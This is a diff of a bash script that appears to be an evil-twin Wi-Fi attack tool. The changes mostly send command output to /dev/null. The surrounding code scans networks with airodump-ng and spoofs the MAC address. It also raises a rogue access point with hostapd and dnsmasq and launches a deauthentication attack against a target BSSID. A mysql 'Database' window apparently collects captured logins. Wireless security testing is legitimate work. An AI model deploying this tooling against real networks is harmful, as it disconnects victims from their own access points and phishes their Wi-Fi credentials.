@@ -131,7 +131,7 @@ selectNetworkInterface2 () {
 }
 
 selectNetwork () {
-        gnome-terminal --geometry 117x50+1000+0 -e "bash -c \"airodump-ng -w $tempFolder/temporal --output-format netxml $interface; exec bash\"" -q -t "airodump-ng"
+        gnome-terminal --geometry 117x50+1000+0 -e "bash -c \"airodump-ng -w $tempFolder/temporal --output-format netxml $interface; exec bash\"" -q -t "airodump-ng">/dev/null
 
         echo "[-] Press enter to stop scanning networks"
         read stop
@@ -214,11 +214,9 @@ then
 ################################ PROGRAMS NEEDED ####################################
 
 	echo "[-] Updating packages..."
-	echo
-	apt-get install -y hostapd apache2 dnsmasq aircrack-ng gnome-terminal
-	rm -r $tempFolder
-	mkdir $tempFolder
-	echo
+	apt-get install -y hostapd apache2 dnsmasq aircrack-ng gnome-terminal>/dev/null
+	rm -r $tempFolder>/dev/null
+	mkdir $tempFolder>/dev/null
 	echo "[+] All packages updated"
 
 ######################### IPTABLES FLUSH TO AVOID CONFLICTS ##########################
@@ -238,10 +236,8 @@ then
 ################################ CHANGE MAC ADDRESS ##################################
 
 	echo "[-] Changing MAC address..."
-	echo
-	macchanger -r $interface
+	macchanger -r $interface>/dev/null
 	ifconfig $interface up
-	echo
 	echo "[+] MAC address changed"
 
 ################################# HOSTAPD CONFIG #####################################
@@ -332,7 +328,7 @@ ignore_broadcast_ssid=0" > $tempFolder/hostapd.conf
 
 	        fi
 
-		gnome-terminal --geometry 117x24+0+0 -e "bash -c \"clear; hostapd $tempFolder/hostapd.conf; exec bash\"" -q -t "$essid $channel"
+		gnome-terminal --geometry 117x24+0+0 -e "bash -c \"clear; hostapd $tempFolder/hostapd.conf; exec bash\"" -q -t "$essid $channel">/dev/null
 		clear
 
 ########################## DNSMASQ CONFIG (DNS & DHCP) ###############################
@@ -381,7 +377,7 @@ ignore_broadcast_ssid=0" > $tempFolder/hostapd.conf
 
 		ifconfig $interface 10.0.0.1
 
-		gnome-terminal --geometry 117x25+0+600 -e "bash -c \"clear; dnsmasq -C $tempFolder/dnsmasq.conf -H $tempFolder/hosts -d; exec bash\"" -q -t "DHCP"
+		gnome-terminal --geometry 117x25+0+600 -e "bash -c \"clear; dnsmasq -C $tempFolder/dnsmasq.conf -H $tempFolder/hosts -d; exec bash\"" -q -t "DHCP">/dev/null
 
 ################################### WEB FILES #########################################
 
@@ -412,15 +408,15 @@ ignore_broadcast_ssid=0" > $tempFolder/hostapd.conf
 			export $bssid
 			export $channel
 	                export $interface2
-			gnome-terminal --geometry 117x25+1000+600 -e "bash -c \"deauth \"$bssid\" \"$channel\" \"$interface2\"; exec bash\"" -q -t "Deauth $essid ($bssid) channel $channel"
+			gnome-terminal --geometry 117x25+1000+600 -e "bash -c \"deauth \"$bssid\" \"$channel\" \"$interface2\"; exec bash\"" -q -t "Deauth $essid ($bssid) channel $channel">/dev/null
 			export -f titulo
-			gnome-terminal --geometry 117x25+1000+0 -e "bash -c \"titulo; mysql; exec bash\"" -q -t "Database"
+			gnome-terminal --geometry 117x25+1000+0 -e "bash -c \"titulo; mysql; exec bash\"" -q -t "Database">/dev/null
 		else
 			export -f titulo
-			gnome-terminal --geometry 117x50+1000+0 -e "bash -c \"titulo; mysql; exec bash\"" -q -t "Database"
+			gnome-terminal --geometry 117x50+1000+0 -e "bash -c \"titulo; mysql; exec bash\"" -q -t "Database">/dev/null
 	        fi
 
-		rm -r $tempFolder
+		rm -r $tempFolder>/dev/null
 
 	fi
 fi
